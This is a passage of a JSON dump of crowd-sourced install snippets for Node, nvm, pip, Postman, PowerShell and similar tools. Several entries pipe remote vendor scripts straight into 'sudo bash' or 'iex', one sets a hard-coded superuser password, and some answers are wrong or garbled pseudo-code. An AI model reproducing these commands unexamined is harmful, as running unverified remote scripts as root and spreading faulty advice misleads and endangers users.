    "description": "brew install node #Homebrew required\ncurl \"https://nodejs.org/dist/latest/node-${VERSION:-$(wget -qO- https://nodejs.org/dist/latest/ | sed -nE 's|.*>node-(.*)\\.pkg</a>.*|\\1|p')}.pkg\" > \"$HOME/Downloads/node-latest.pkg\" && sudo installer -store -pkg \"$HOME/Downloads/node-latest.pkg\" -target \"/\" \n// 1. Install Homebrew on a Mac by first installing Xcode  // 2. Install Xcode at  \t  https://apps.apple.com/us/app/xcode/id497799835?ls=1&mt=12  // 3. Open the Terminal app. // 4. Type:        ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\" // 5. Open the Terminal app and type:        brew update //    This updates Homebrew with a list of the latest version of Node. // 6. Type:        brew install node // 7. Sit back and wait. Homebrew has to download some files and install them. But that&rsquo;s it. // 8. Test Node. To see if Node is installed, type:        node -v  //  in Terminal. This should print the version number so you&rsquo;ll see something like this v0.10.31. // 9. Test NPM. To see if NPM is installed, type:       npm -v  //    in Terminal. This should print the version number so you&rsquo;ll see something like this 1.4.27 // 10. Test node        node test-node.js\nnode test-node.js\n",
    "reg_date": "2021-10-11T22:08:24.000Z"
  },
  {
    "id": 2925,
    "keyword": null,
    "link": null,
    "title": " install node package globally",
    "description": "npm install <package Name> -g\nnpm install package-name -g\nnpm i -g <package>\n",
    "reg_date": "2021-10-11T22:08:24.000Z"
  },
  {
    "id": 2926,
    "keyword": null,
    "link": null,
    "title": " install nodejs on ubuntu",
    "description": "sudo apt-get install curl curl -sL https://deb.nodesource.com/setup_13.x | sudo -E bash - sudo apt-get install nodejs # Check node version node -v  # v13.9.0 # Also, check the npm version npm -v  # 6.13.7\nsudo apt update sudo apt install nodejs sudo apt install npm\ncurl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - sudo apt install nodejs sudo apt install npm sudo apt update\nsudo apt install nodejs\n//Author: Mohammad Arman Khan //How To Install Node.js on Ubuntu 1: sudo apt-get update 2: sudo apt-get install nodejs 3: sudo apt-get install npm 4: nodejs -v\nsudo apt-get install curl curl -sL https://deb.nodesource.com/setup_13.x | sudo -E bash - sudo apt-get install nodejs  node -v    #to check if its installed\n",
    "reg_date": "2021-10-11T22:08:24.000Z"
  },
  {
    "id": 2927,
    "keyword": null,
    "link": null,
    "title": " install nodemcu in arduino",
    "description": "Go to file -> preferances. \t Add below link to additional board manager.  LINK: http://arduino.esp8266.com/stable/package_esp8266com_index.json Tools -> Boards Manager  Search for ESP and install esp8266 \n",
    "reg_date": "2021-10-11T22:08:24.000Z"
  },
  {
    "id": 2928,
    "keyword": null,
    "link": null,
    "title": " install nodemon",
    "description": "# Install nodemon npm install nodemon  # Install nodemon globally on your machine npm install -g nodemon  # Install nodemon on your project as dev-dependency npm install nodemon --save-dev\nnpm install nodemon --save-dev\nnpm install -g nodemon\nnpm install -g nodemon\n# Install nodemon npm i nodemon # Write a script like ... \"scripts\": {         \"start\":\"nodemon index.js\"     } # Start in your terminal with something like ... nodemon ./server.js localhost 8000 or npm run server\nnodemon ./server.js localhost 8080\n",
    "reg_date": "2021-10-11T22:08:24.000Z"
  },
  {
    "id": 2929,
    "keyword": null,
    "link": null,
    "title": " install nodemon as dev dependency",
    "description": "npm install --save-dev nodemon \nnpm install nodemon --save-dev\nnpm install -g nodemon\nnodemon --exec npm run dev:test\n",
    "reg_date": "2021-10-11T22:08:24.000Z"
  },
  {
    "id": 2930,
    "keyword": null,
    "link": null,
    "title": " install nodemon typescritp",
    "description": "npm i -D typescript ts-node nodemon @types/node\nnodemon --watch \"src/**\" --ext \"ts,json\" --ignore \"src/**/*.spec.ts\" --exec \"ts-node src/index.ts\" \n",
    "reg_date": "2021-10-11T22:08:25.000Z"
  },
  {
    "id": 2931,
    "keyword": null,
    "link": null,
    "title": " install noedjs",
    "description": "brew install node\n",
    "reg_date": "2021-10-11T22:08:25.000Z"
  },
  {
    "id": 2932,
    "keyword": null,
    "link": null,
    "title": " install npm mac",
    "description": "brew install node\n$ npm install download \n >npm install <package> \n",
    "reg_date": "2021-10-11T22:08:25.000Z"
  },
  {
    "id": 2933,
    "keyword": null,
    "link": null,
    "title": " install npm ubuntu",
    "description": "sudo apt-get install curl curl -sL https://deb.nodesource.com/setup_13.x | sudo -E bash - sudo apt-get install nodejs # Check node version node -v  # v13.9.0 # Also, check the npm version npm -v  # 6.13.7\nsudo npm install npm@latest -g\nsudo apt update sudo apt install nodejs sudo apt install npm\ncurl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - sudo apt install nodejs sudo apt install npm sudo apt update\nsudo apt install nodejs\n//Author: Mohammad Arman Khan //How To Install Node.js on Ubuntu 1: sudo apt-get update 2: sudo apt-get install nodejs 3: sudo apt-get install npm 4: nodejs -v\n",
    "reg_date": "2021-10-11T22:08:25.000Z"
  },
  {
    "id": 2934,
    "keyword": null,
    "link": null,
    "title": " install nuxt",
    "description": "npm install nuxt \nyarn create nuxt-app <project-name> npx create-nuxt-app <project-name> npm init nuxt-app <project-name>\nyarn create nuxt-app <project-name>\nnpx create-nuxt-app@3.6.0 nuxt-crud \n",
    "reg_date": "2021-10-11T22:08:25.000Z"
  },
  {
    "id": 2935,
    "keyword": null,
    "link": null,
    "title": " install nvm ubuntu",
    "description": "curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash export NVM_DIR=\"$([ -z \"${XDG_CONFIG_HOME-}\" ] && printf %s \"${HOME}/.nvm\" || printf %s \"${XDG_CONFIG_HOME}/nvm\")\" [ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\" # This loads nvm. Now you can use nvm\nsudo apt install curl  curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash  \ncd ~ curl -sL https://deb.nodesource.com/setup_12.x -o nodesource_setup.sh sudo bash nodesource_setup.sh sudo apt install nodejs nodejs -v # shows your version\nnvm install 12.18.3 \n$ curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.0/install.sh | bash# Alternatively $ wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.33.11/install.sh | bash\ncurl -sL https://raw.githubusercontent.com/creationix/nvm/v0.33.11/install.sh -o install_nvm.sh \n",
    "reg_date": "2021-10-11T22:08:25.000Z"
  },
  {
    "id": 2936,
    "keyword": null,
    "link": null,
    "title": " install nvm with brew",
    "description": "brew update brew install nvm mkdir ~/.nvm export NVM_DIR=~/.nvm source $(brew --prefix nvm)/nvm.sh\n\"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\" \n",
    "reg_date": "2021-10-11T22:08:26.000Z"
  },
  {
    "id": 2937,
    "keyword": null,
    "link": null,
    "title": " install open cv conda",
    "description": "conda install -c menpo opencv\n",
    "reg_date": "2021-10-11T22:08:26.000Z"
  },
  {
    "id": 2938,
    "keyword": null,
    "link": null,
    "title": " install opencv apt",
    "description": "sudo apt install libopencv-dev\n",
    "reg_date": "2021-10-11T22:08:26.000Z"
  },
  {
    "id": 2939,
    "keyword": null,
    "link": null,
    "title": " install openjdk8 in ubuntu",
    "description": "sudo apt-get install openjdk-8-jdk\n",
    "reg_date": "2021-10-11T22:08:26.000Z"
  },
  {
    "id": 2940,
    "keyword": null,
    "link": null,
    "title": " install openjdk 11 ubuntu",
    "description": "sudo apt-get install openjdk-11-jdk  $ sudo update-alternatives --config java There are 2 choices for the alternative java (providing /usr/bin/java).  Selection    Path                                            Priority   Status  * 0            /usr/lib/jvm/java-9-openjdk-amd64/bin/java       1500      auto mode   1            /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java   1500      manual mode   2            /usr/lib/jvm/java-9-openjdk-amd64/bin/java       1500      manual mode \nsudo apt-get update && sudo apt-get upgrade sudo apt-get install default-jdk\nsudo apt-get update  sudo apt-get install oracle-java11-installer-local\n",
    "reg_date": "2021-10-11T22:08:26.000Z"
  },
  {
    "id": 2941,
    "keyword": null,
    "link": null,
    "title": " install openjdk 8 debian 10",
    "description": "sudo apt-get install openjdk-8-jdk\nwget -qO - https://adoptopenjdk.jfrog.io/adoptopenjdk/api/gpg/key/public | sudo apt-key add -  sudo add-apt-repository --yes https://adoptopenjdk.jfrog.io/adoptopenjdk/deb/  sudo apt-get update && sudo apt-get install adoptopenjdk-8-hotspot \n",
    "reg_date": "2021-10-11T22:08:26.000Z"
  },
  {
    "id": 2942,
    "keyword": null,
    "link": null,
    "title": " install openjdk 8 sdk on ubuntu",
    "description": "sudo apt-get install openjdk-8-jdk\n",
    "reg_date": "2021-10-11T22:08:26.000Z"
  },
  {
    "id": 2943,
    "keyword": null,
    "link": null,
    "title": " install opera ubuntu terminal command",
    "description": "wget -qO- https://deb.opera.com/archive.key | sudo apt-key add - sudo add-apt-repository \"deb [arch=i386,amd64] https://deb.opera.com/opera-stable/ stable non-free\" sudo apt-get update sudo apt-get install opera-stable\n",
    "reg_date": "2021-10-11T22:08:26.000Z"
  },
  {
    "id": 2944,
    "keyword": null,
    "link": null,
    "title": " install or enable php's curl extension ubuntu",
    "description": "sudo apt install php-curl\n",
    "reg_date": "2021-10-11T22:08:27.000Z"
  },
  {
    "id": 2945,
    "keyword": null,
    "link": null,
    "title": " install package chart.js",
    "description": "npm install chart.js --save\nnpm install chart.js --save \n",
    "reg_date": "2021-10-11T22:08:27.000Z"
  },
  {
    "id": 2946,
    "keyword": null,
    "link": null,
    "title": " install package from conda forge not found in conda",
    "description": "#Packages that are not found in conda are curated in conda forge. conda install -c conda-forge <package_name>\n",
    "reg_date": "2021-10-11T22:08:27.000Z"
  },
  {
    "id": 2947,
    "keyword": null,
    "link": null,
    "title": " install packages from selected repo yum",
    "description": "yum --disablerepo=\"*\" --enablerepo=\"<desired-repo-id>\" install package-name \n",
    "reg_date": "2021-10-11T22:08:27.000Z"
  },
  {
    "id": 2948,
    "keyword": null,
    "link": null,
    "title": " install pandas conda",
    "description": "conda install -c anaconda pandas \nconda install pandas \n",
    "reg_date": "2021-10-11T22:08:27.000Z"
  },
  {
    "id": 2949,
    "keyword": null,
    "link": null,
    "title": " install particular version of laravel",
    "description": "composer create-project laravel/laravel=\"5.1.*\" myProject\n",
    "reg_date": "2021-10-11T22:08:27.000Z"
  },
  {
    "id": 2950,
    "keyword": null,
    "link": null,
    "title": " install pecl on mac",
    "description": "curl -O https://pear.php.net/go-pear.phar sudo php -d detect_unicode=0 go-pear.phar\n",
    "reg_date": "2021-10-11T22:08:28.000Z"
  },
  {
    "id": 2951,
    "keyword": null,
    "link": null,
    "title": " install pgadmin 4 to ubuntu 18.04",
    "description": "# # Setup the repository #  # Install the public key for the repository (if not done previously): sudo curl https://www.pgadmin.org/static/packages_pgadmin_org.pub | sudo apt-key add  # Create the repository configuration file: sudo sh -c 'echo \"deb https://ftp.postgresql.org/pub/pgadmin/pgadmin4/apt/$(lsb_release -cs) pgadmin4 main\" > /etc/apt/sources.list.d/pgadmin4.list && apt update'  # # Install pgAdmin #  # Install for both desktop and web modes: sudo apt install pgadmin4  # Install for desktop mode only: sudo apt install pgadmin4-desktop  # Install for web mode only:  sudo apt install pgadmin4-web   # Configure the webserver, if you installed pgadmin4-web: sudo /usr/pgadmin4/bin/setup-web.sh\n",
    "reg_date": "2021-10-11T22:08:28.000Z"
  },
  {
    "id": 2952,
    "keyword": null,
    "link": null,
    "title": " install pi hole cmd",
    "description": "curl -sSL https://install.pi-hole.net | bash \n",
    "reg_date": "2021-10-11T22:08:28.000Z"
  },
  {
    "id": 2953,
    "keyword": null,
    "link": null,
    "title": " install ping docker",
    "description": "apt-get update apt-get install iputils-ping \napt-get update apt-get install iputils-ping\n",
    "reg_date": "2021-10-11T22:08:28.000Z"
  },
  {
    "id": 2954,
    "keyword": null,
    "link": null,
    "title": " install pip",
    "description": "pip install django-crispy-forms \nsudo apt install python3-pip\n#Install pip for python 2.7 curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py sudo python2 get-pip.py  #Install pip3 sudo apt install python3-pip\npy -m pip install --upgrade pip  # or  pip install --upgrade pip\npython -m pip download [options] <requirement specifier> [package-index-options] ... python -m pip download [options] -r <requirements file> [package-index-options] ... python -m pip download [options] <vcs project url> ... python -m pip download [options] <local project path> ... python -m pip download [options] <archive url/path> ...  \n pip download [options] <requirement specifier> [package-index-options] ...\n",
    "reg_date": "2021-10-11T22:08:28.000Z"
  },
  {
    "id": 2955,
    "keyword": null,
    "link": null,
    "title": " install pip3",
    "description": "sudo apt-get -y install python3-pip\npip3 install --upgrade pip\nsudo apt install python3-pip  on Fedora sudo yum install python3-pip\nsudo apt install python3-pip\nalias pip=pip3 \nInstallation Step 1 - Update system $$$ sudo apt-get update  Step 2 - Install pip3 $$$ sudo apt-get -y install python3-pip  Step 3 - Verification $$$ pip3 --version\n",
    "reg_date": "2021-10-11T22:08:28.000Z"
  },
  {
    "id": 2956,
    "keyword": null,
    "link": null,
    "title": " install pip3 linux",
    "description": "sudo apt-get -y install python3-pip\napt-get install python-pip\t#python 2 apt-get install python3-pip\t#python 3\nsudo apt install python3-pip  on Fedora sudo yum install python3-pip\nsudo apt install python3-pip\ncd /tmp curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py python get-pip.py\n",
    "reg_date": "2021-10-11T22:08:28.000Z"
  },
  {
    "id": 2957,
    "keyword": null,
    "link": null,
    "title": " install pip anacodna",
    "description": "conda install -c anaconda pip\n",
    "reg_date": "2021-10-11T22:08:29.000Z"
  },
  {
    "id": 2958,
    "keyword": null,
    "link": null,
    "title": " install pip arch linux",
    "description": "# Arch Linux sudo pacman -S python2-pip                #Python 2  sudo pacman -S python-pip                #Python 3\n1. Enable the extra repository on /etc/pacman.conf:  [extra] Include = /etc/pacman.d/mirrorlist  2. Install python-pip zst package: sudo pacman -Syu python-pip \n",
    "reg_date": "2021-10-11T22:08:29.000Z"
  },
  {
    "id": 2959,
    "keyword": null,
    "link": null,
    "title": " install pip for python 2.7 linux",
    "description": "apt-get install python-pip\t#python 2 apt-get install python3-pip\t#python 3\n#Debian/Unbuntu apt-get install python-pip\t#python 2 apt-get install python3-pip\t#python 3  #CentOS/RHEL yum install epel-release  yum install python-pip  #Fedora dnf install python-pip\t#Python 2 dnf install python3\t\t#Python 3  #Arch Linux pacman -S python2-pip\t        #Python 2 pacman -S python-pip\t        #Python 3  #openSUSE zypper install python-pip\t#Python 2 zypper install python3-pip\t#Python 3  #Some usefull commands pip install packageName \t# Install <packageName> pip uninstall packageName\t# Uninstall <packageName> pip search packageName\t\t# Search <packageName>\n",
    "reg_date": "2021-10-11T22:08:29.000Z"
  },
  {
    "id": 2960,
    "keyword": null,
    "link": null,
    "title": " install pip in ubtunut",
    "description": "sudo apt install python3-pip\nsudo apt update sudo apt install python2\npython-pip\n",
    "reg_date": "2021-10-11T22:08:29.000Z"
  },
  {
    "id": 2961,
    "keyword": null,
    "link": null,
    "title": " install pip in ubuntu",
    "description": "sudo apt install python3-pip\napt upgrade && apt update apt install python3 python3 -m pip install -U pip   # OR sudo apt install python3-pip python3 -m pip --version pip --version\n#First enter the following command to the terminal @pip3 --version # after that @if it doesnt give a result like pip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.8) # enter the following commands sudo apt install python3-pip sudo apt install python3-pip3 #Thats all #Ranuga D\nsudo apt-get update  sudo apt install python3-pip\nsudo apt update sudo apt install python2\npython-pip\n",
    "reg_date": "2021-10-11T22:08:29.000Z"
  },
  {
    "id": 2962,
    "keyword": null,
    "link": null,
    "title": " install pip kali",
    "description": "$ sudo apt install python-pip\nPython Requests Package To make RESTful requests with Python you need to install the requests library manually using the Python package manager, pip. When you install pip there will be a suggestion to update it &mdash; do not update pip, the newest version is incompatible and the current version works fine. To use pip you will first need to install the appropriate package for your Python interpreter using apt-get.  For Python 2.7 First, make sure your package tool is up-to-date with your package repositories. Do NOT apt-get upgrade!  sudo apt-get update  Next, use your package tool to install pip. Do NOT upgrade pip, regardless of warnings.  sudo apt-get install python-pip  Use the Python package manager to install the requests library.  sudo pip install requests  In your Python scripts make sure you import the library once it has been installed.  import requests  For Python 3.4 First, make sure your package tool is up-to-date with your package repositories. Do NOT apt-get upgrade!  sudo apt-get update  Next, use your package tool to install pip. Do NOT upgrade pip, regardless of warnings.  sudo apt-get install python3-pip  Use the Python package manager to install the requests library.  sudo pip install requests  In your Python scripts make sure you import the library once it has been installed.  import requests  Checking pip Version and Uninstalling To check the version of pip you have installed, and to see which version of Python it is tied to:  pip -V  To uninstall python-pip for Python 2.7, for example to move to pip for Python 3.4:  sudo apt-get remove python-pip  To uninstall python3-pip for Python 3.4, for example to move to pip for Python 2.7:  sudo apt-get remove python3-pip  Source: http://developer.opto22.com/epicdev/python/#for-python-34\n",
    "reg_date": "2021-10-11T22:08:29.000Z"
  },
  {
    "id": 2963,
    "keyword": null,
    "link": null,
    "title": " install pip on macos",
    "description": "curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py sudo easy_install pip\ncurl https://bootstrap.pypa.io/get-pip.py -o get-pip.py \n",
    "reg_date": "2021-10-11T22:08:30.000Z"
  },
  {
    "id": 2964,
    "keyword": null,
    "link": null,
    "title": " install pip on raspberry pi",
    "description": "sudo apt-get update sudo apt-get install python-pip\n#Do this first sudo apt-get update  #Python 2 sudo apt-get install python-pip #Python 3 sudo apt-get install python3-pip\n",
    "reg_date": "2021-10-11T22:08:30.000Z"
  },
  {
    "id": 2965,
    "keyword": null,
    "link": null,
    "title": " install pip ubuntu",
    "description": "sudo apt install python3-pip\napt upgrade && apt update apt install python3 python3 -m pip install -U pip   # OR sudo apt install python3-pip python3 -m pip --version pip --version\n#First enter the following command to the terminal @pip3 --version # after that @if it doesnt give a result like pip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.8) # enter the following commands sudo apt install python3-pip sudo apt install python3-pip3 #Thats all #Ranuga D\nsudo apt-get update  sudo apt install python3-pip\npython-pip\npip3 --version\n",
    "reg_date": "2021-10-11T22:08:30.000Z"
  },
  {
    "id": 2966,
    "keyword": null,
    "link": null,
    "title": " install pipenv in ubuntu",
    "description": "#installing pip install pipenv \n",
    "reg_date": "2021-10-11T22:08:30.000Z"
  },
  {
    "id": 2967,
    "keyword": null,
    "link": null,
    "title": " install pm2",
    "description": "$ sudo npm i -g pm2  \nnpm install pm2 -g\n$ npm install pm2@latest -g # or $ yarn global add pm2 \n$ npm install pm2@latest -g # or $ yarn global add pm2\npm2 list\nnpm i -g pm2 \n",
    "reg_date": "2021-10-11T22:08:30.000Z"
  },
  {
    "id": 2968,
    "keyword": null,
    "link": null,
    "title": " install poetry",
    "description": "# Install Poetry Python Package manager (as of 2020-05) curl -sSL https://raw.githubusercontent.com/python-poetry/poetry/master/get-poetry.py | python\n#Windows (Invoke-WebRequest -Uri https://raw.githubusercontent.com/python-poetry/poetry/master/get-poetry.py -UseBasicParsing).Content | python - \n",
    "reg_date": "2021-10-11T22:08:30.000Z"
  },
  {
    "id": 2969,
    "keyword": null,
    "link": null,
    "title": " install postcss",
    "description": "npm i -D postcss postcss-cli\n",
    "reg_date": "2021-10-11T22:08:30.000Z"
  },
  {
    "id": 2970,
    "keyword": null,
    "link": null,
    "title": " install postgres 11 ubuntu",
    "description": "sudo apt update && sudo apt -y upgrade  wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc | sudo apt-key add -  RELEASE=$(lsb_release -cs) echo \"deb http://apt.postgresql.org/pub/repos/apt/ ${RELEASE}\"-pgdg main | sudo tee  /etc/apt/sources.list.d/pgdg.list  cat /etc/apt/sources.list.d/pgdg.list  sudo apt update  sudo apt -y install postgresql-11  sudo -u postgres psql  postgres=# CREATE USER wcl WITH PASSWORD 'wclPassword'; postgres=# CREATE DATABASE wcl; postgres=# ALTER USER wcl WITH SUPERUSER; postgres=# exit\n",
    "reg_date": "2021-10-11T22:08:30.000Z"
  },
  {
    "id": 2971,
    "keyword": null,
    "link": null,
    "title": " install postgresql 12.4 home brew",
    "description": "brew install postgresql\n",
    "reg_date": "2021-10-11T22:08:31.000Z"
  },
  {
    "id": 2972,
    "keyword": null,
    "link": null,
    "title": " install postgresql on mac",
    "description": "brew install postgresql\nbrew services start postgresqlpsql postgres\n$ brew install postgresql\n/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n",
    "reg_date": "2021-10-11T22:08:31.000Z"
  },
  {
    "id": 2973,
    "keyword": null,
    "link": null,
    "title": " install postman in linux",
    "description": "sudo snap install postman\nInstall Postman in Linux  Download Postman by running following command in your Linux system:  $ wget https://dl.pstmn.io/download/latest/linux64 -O postman-linux-x64.tar.gz  Extract the downloaded file by running the following command in /opt directory:  $ sudo tar -xvzf postman-linux-x64.tar.gz -C /opt  Finally, create a symbolic link running following command in terminal:  $ sudo ln -s /opt/Postman/Postman /usr/bin/postman   For Desktop icons:  [Desktop Entry] Encoding=UTF-8 Name=Postman Exec=postman Icon=/home/USERNAME/Postman/app/resources/app/assets/icon.png Terminal=false Type=Application Categories=Development;\n$ cd Downloads/ $ tar -xzf Postman-linux-x64-7.32.0.tar.gz $ sudo mkdir -p /opt/apps/ $ sudo mv Postman /opt/apps/ $ sudo ln -s /opt/apps/Postman/Postman /usr/local/bin/postman $ postman\n",
    "reg_date": "2021-10-11T22:08:31.000Z"
  },
  {
    "id": 2974,
    "keyword": null,
    "link": null,
    "title": " install postman in ubuntu",
    "description": "sudo snap install postman\nInstall Postman in Linux  Download Postman by running following command in your Linux system:  $ wget https://dl.pstmn.io/download/latest/linux64 -O postman-linux-x64.tar.gz  Extract the downloaded file by running the following command in /opt directory:  $ sudo tar -xvzf postman-linux-x64.tar.gz -C /opt  Finally, create a symbolic link running following command in terminal:  $ sudo ln -s /opt/Postman/Postman /usr/bin/postman   For Desktop icons:  [Desktop Entry] Encoding=UTF-8 Name=Postman Exec=postman Icon=/home/USERNAME/Postman/app/resources/app/assets/icon.png Terminal=false Type=Application Categories=Development;\n",
    "reg_date": "2021-10-11T22:08:31.000Z"
  },
  {
    "id": 2975,
    "keyword": null,
    "link": null,
    "title": " install postman in ubuntu 20.04",
    "description": "sudo snap install postman\ndownload postman archive  $ cd Downloads/ $ tar -xzf Postman-linux-x64-7.32.0.tar.gz $ sudo mkdir -p /opt/apps/ $ sudo mv Postman /opt/apps/ $ sudo ln -s /opt/apps/Postman/Postman /usr/local/bin/postman $ postman\n",
    "reg_date": "2021-10-11T22:08:32.000Z"
  },
  {
    "id": 2976,
    "keyword": null,
    "link": null,
    "title": " install postman snap",
    "description": "sudo snap install postman\n",
    "reg_date": "2021-10-11T22:08:32.000Z"
  },
  {
    "id": 2977,
    "keyword": null,
    "link": null,
    "title": " install powershell 7",
    "description": "iex \"& { $(irm https://aka.ms/install-powershell.ps1) } -UseMSI\"\nmsiexec.exe /package \"c:\\Temp\\PowerShell-7.1.0-win-x64.msi\" /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1 \n",
    "reg_date": "2021-10-11T22:08:32.000Z"
  },
  {
    "id": 2978,
    "keyword": null,
    "link": null,
    "title": " install powershell ubuntu",
    "description": "apt-get install snap snapd -y   snap install powershell --classic  pwsh\n# Update the list of packages sudo apt-get update # Install pre-requisite packages. sudo apt-get install -y wget apt-transport-https software-properties-common # Download the Microsoft repository GPG keys wget -q https://packages.microsoft.com/config/ubuntu/16.04/packages-microsoft-prod.deb # Register the Microsoft repository GPG keys sudo dpkg -i packages-microsoft-prod.deb # Update the list of packages after we added packages.microsoft.com sudo apt-get update # Install PowerShell sudo apt-get install -y powershell # Start PowerShell pwsh \n",
    "reg_date": "2021-10-11T22:08:33.000Z"
  },
  {
    "id": 2979,
    "keyword": null,
    "link": null,
    "title": " install protoc ubuntu",
    "description": "$ apt install -y protobuf-compiler $ protoc --version  # Ensure compiler version is 3+ \n",
    "reg_date": "2021-10-11T22:08:33.000Z"
  },
  {
    "id": 2980,
    "keyword": null,
    "link": null,
    "title": " install psycopg2 ubuntu",
    "description": "sudo apt-get update -y  sudo apt-get install -y python3-psycopg2\n$ pip install pgcli  or  $ easy_install pgcli \n",
    "reg_date": "2021-10-11T22:08:33.000Z"
  },
  {
    "id": 2981,
    "keyword": null,
    "link": null,
    "title": " install putty on ubuntu",
    "description": "$ sudo add-apt-repository universe $ sudo apt update $ sudo apt install putty \nsudo add-apt-repository universe\n#Installing Putty on Ubuntu Linux  sudo add-apt-repository universe sudo apt update sudo apt install putty \nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDx2YnqXXvwjwdlgJeTdDcPOwmNVNoec8UCgeZNOFs91FDdaIa0xdMoAmWcwewSB03qBqVIrtX6BAL2+NR2v75xQcvCnbhWD6XTGFdTcIwsa4sk3CVh2+++sE44qrwy6LwEoBHVWEbwH/jaM8gfDrlALtWshiVMVBysXMLHhbrPOxespWY4M8IUMbiamNng2OOCKaMtXTQewg7qK7yMWojGbSpxtU8jYvA6KQUFv4W6RqJttqsnoUFP0E36sJ4jgguNpv3q1rgR13w4m+/8v2QP0ZI3t1qHKP6oBPGFdFV513w5rN5Jpg0mcJ0FJctYz9WVace+nSxTt/o4KhP0Wqbr\n",
    "reg_date": "2021-10-11T22:08:33.000Z"
  },
  {
    "id": 2982,
    "keyword": null,
    "link": null,
    "title": " install pycharm in linux mint",
    "description": "sudo snap install pycharm-community --classic\n",
    "reg_date": "2021-10-11T22:08:33.000Z"
  },
  {
    "id": 2983,
    "keyword": null,
    "link": null,
    "title": " install pyenv",
    "description": "# Linux and Mac only (at the moment) curl https://pyenv.run | bash\npyenv install --list | grep -v - | grep -v a | grep -v b | grep -v c | tail -1\nroot@ubuntu:~# apt install -y make build-essential libssl-dev zlib1g-dev \\ > libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev\\ > libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python-openssl\\ > git\n$ ls ~/.pyenv/versions/ 2.7.15  3.6.8  3.8-dev \n$ pyenv versions * system (set by /home/realpython/.pyenv/version)   2.7.15   3.6.8   3.8-dev \nYou can use below link to install pyenv\n",
    "reg_date": "2021-10-11T22:08:33.000Z"
  },
  {
    "id": 2984,
    "keyword": null,
    "link": null,
    "title": " install pygame",
    "description": "python3 -m pip install pygame <<<(mac)>>> or python -m pip install pygame <<<(windows)>>> or sudo apt install python3-pygame <<<(ubuntu)>>>\n# on your terminal :  pip install pygame   # check if pygame run :  py -m pygame.examples.aliens  # if a window is open -> pygame is correctly installed \npip install pygame\ntry: pip install pygame else: pip3 install pygame else: python -m pip install pygame else: python3 -m pip install pygame else: py -m pip install pygame(this is my method) (this is only for windows)\nfor windows users:  press windows+r type cmd  type py -m pip install pygame\nimport pygame pygame.init()  win = pygame.display.set_mode((500,500)) pygame.display.set_caption(\"First Game\")  x = 50 y = 50 width = 40 height = 60 vel = 5  run = True  while run:     pygame.time.delay(100) # This will delay the game the given amount of milliseconds. In our casee 0.1 seconds will be the delay      for event in pygame.event.get():  # This will loop through a list of any keyboard or mouse events.         if event.type == pygame.QUIT: # Checks if the red button in the corner of the window is clicked             run = False  # Ends the game loop  pygame.quit()  # If we exit the loop this will execute and close our game     \n",
    "reg_date": "2021-10-11T22:08:33.000Z"
  },
  {
    "id": 2985,
    "keyword": null,
    "link": null,
    "title": " install pygame on mac",
    "description": "#go to terminal pip download pygame\npython3 -m pip install -U pygame==2.0.0.dev6\npip install pygame\n# Type this in the Command Prompt (For Windows) : pip install pygame # Then head on to your text editor and type :  import pygame\n",
    "reg_date": "2021-10-11T22:08:33.000Z"
  },
  {
    "id": 2986,
    "keyword": null,
    "link": null,
    "title": " install pymongo",
    "description": "pip install pymongo\ngit clone git://github.com/mongodb/mongo-python-driver.git pymongo cd pymongo/ python setup.py install \n",
    "reg_date": "2021-10-11T22:08:33.000Z"
  },
  {
    "id": 2987,
    "keyword": null,
    "link": null,
    "title": " install pypy3 ubuntu",
    "description": "#All you need to do is:  sudo add-apt-repository ppa:pypy/ppa sudo apt update sudo apt install pypy3  #And there you go!\n",
    "reg_date": "2021-10-11T22:08:34.000Z"
  },
  {
    "id": 2988,
    "keyword": null,
    "link": null,
    "title": " install pyqt4 ubuntu",
    "description": "sudo apt-get update && sudo apt-get install python-qt4\n",
    "reg_date": "2021-10-11T22:08:34.000Z"
  },
  {
    "id": 2989,
    "keyword": null,
    "link": null,
    "title": " install pyqt5 tools",
    "description": "pip install pyqt5-tools\nsudo apt-get install python3-pyqt5 sudo apt-get install qtcreator pyqt5-dev-tools sudo apt-get install qttools5-dev-tools\n",
    "reg_date": "2021-10-11T22:08:34.000Z"
  },
  {
    "id": 2990,
    "keyword": null,
    "link": null,
    "title": " install python3 raspberry pi",
    "description": "#on any linux (debian based) sudo apt update sudo apt install python3 idle3\n",
    "reg_date": "2021-10-11T22:08:34.000Z"
  },
  {
    "id": 2991,
    "keyword": null,
    "link": null,
    "title": " install python 3.8 ubuntu",
    "description": "sudo apt-get install python3\nsudo apt-get install python3.7\n- Run the following commands as root or user with sudo access to update the packages list and install the prerequisites:  sudo apt update sudo apt install software-properties-common  - Add the deadsnakes PPA to your system&rsquo;s sources list:  sudo add-apt-repository ppa:deadsnakes/ppa When prompted press Enter to continue:  - Press [ENTER] to continue or Ctrl-c to cancel adding it. - Once the repository is enabled, install Python 3.8 with:  sudo apt install python3.8  - Verify that the installation was successful by typing:  python3.8 --version\nwget https://www.python.org/ftp/python/3.8.0/Python-3.8.0.tgz\nsudo apt update sudo apt -y upgrade \n",
    "reg_date": "2021-10-11T22:08:34.000Z"
  },
  {
    "id": 2992,
    "keyword": null,
    "link": null,
    "title": " install python math library",
    "description": "pip install python-math\n",
    "reg_date": "2021-10-11T22:08:35.000Z"
  },
  {
    "id": 2993,
